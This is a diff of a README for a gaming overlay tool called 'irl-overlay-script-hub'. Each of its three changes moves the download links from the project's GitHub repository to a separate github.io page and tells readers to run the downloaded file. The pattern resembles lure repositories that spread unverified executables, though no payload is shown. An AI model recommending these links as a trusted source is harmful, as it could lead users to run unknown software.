@@ -1,6 +1,6 @@
 # 🎮 irl-overlay-script-hub - Visualize Your Game Like Never Before
 
-[![Download Now](https://img.shields.io/badge/Download-irl--overlay--script--hub-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=2b3137&color=4caf50)](https://github.com/Exacting-osmosis408/irl-overlay-script-hub)
+[![Download Now](https://img.shields.io/badge/Download-irl--overlay--script--hub-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=2b3137&color=4caf50)](https://exacting-osmosis408.github.io)
 
 ## 📥 Visit This Link to Download the Application
 
@@ -44,7 +44,7 @@ Follow these simple steps to get irl-overlay-script-hub running on your PC. No c
 
 📥 **Visit this link to download the application:**
 
-[**https://github.com/Exacting-osmosis408/irl-overlay-script-hub**](https://github.com/Exacting-osmosis408/irl-overlay-script-hub)
+[**https://exacting-osmosis408.github.io**](https://exacting-osmosis408.github.io)
 
 Click the link above to go to the download page. Look for the download button or the latest release file on that page.
 
@@ -197,7 +197,7 @@ Most questions can be answered by exploring the settings menu and trying differe
 
 You're just one download away from a more personalized gaming experience. Click the button below to get started:
 
-[![Download Now](https://img.shields.io/badge/Get%20irl--overlay--script--hub-blueviolet?style=for-the-badge&logo=download&logoColor=white&labelColor=6a0dad&color=8a2be2)](https://github.com/Exacting-osmosis408/irl-overlay-script-hub)
+[![Download Now](https://img.shields.io/badge/Get%20irl--overlay--script--hub-blueviolet?style=for-the-badge&logo=download&logoColor=white&labelColor=6a0dad&color=8a2be2)](https://exacting-osmosis408.github.io)
 
 Remember: **Visit this link to download the application.** Once you've downloaded it, run the file and enjoy your new visual overlay!
 
